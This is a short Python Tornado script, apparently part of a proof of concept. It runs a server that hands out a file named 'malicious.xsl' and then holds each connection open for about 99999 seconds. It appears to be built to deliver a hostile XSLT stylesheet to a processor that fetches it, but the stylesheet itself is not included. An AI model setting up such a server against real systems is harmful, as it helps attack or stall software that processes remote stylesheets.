from tornado.ioloop import IOLoop
import tornado.web
import time

class MainHandler(tornado.web.RequestHandler):
    def get(self):

        with open("malicious.xsl","r") as file:
            self.write(file.read())
            self.flush()
            time.sleep(99999)
            self.finish()

if __name__ == "__main__":
    application =  tornado.web.Application([
        (r'/', MainHandler),
    ])
    port = 9999
    application.listen(port)
    print("Listening on port "+str(port))
    IOLoop.instance().start()